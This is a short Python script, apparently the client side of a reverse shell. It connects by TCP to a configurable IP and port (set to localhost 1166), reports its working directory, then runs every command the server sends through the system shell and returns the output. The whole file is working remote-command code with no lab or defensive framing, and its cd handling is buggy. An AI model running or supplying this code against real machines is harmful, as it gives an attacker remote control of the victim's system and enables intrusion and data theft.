import subprocess
import socket
import os
# set IP is LocalHost and a port .
ip='127.0.0.1'
port=1166
# separator string .
separator="<sep>"
#create a socket object.
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connect to server .
s.connect((ip, port))
print('--- Connected ---')
#get current directory and send this for server .
cwd=os.getcwd()
s.send(cwd.encode())
while True:
    #receive command from server and split this .
    msg=s.recv(1024*128).decode()
    splited_msg=msg.split()
    #if command is exit, break out the loop .
    if msg.lower()=='exit':
        break
    #if splited command[0] is 'cd', get to change directory .
    if splited_msg[0].lower()=='cd':
        try:
            os.chdir(' '.join(splited_msg[1:]))
            # if have a Error, get error
        except FileNotFoundError as e:
            output=str(e)
        else:
            output=""
    # get command from subprocess and send for server .
    output=subprocess.getoutput(msg)
    cwd=os.getcwd()
    # command output, current directory and separator string .
    message=f"{output}{separator}{cwd}"
    s.send(message.encode())
s.close()
        
    
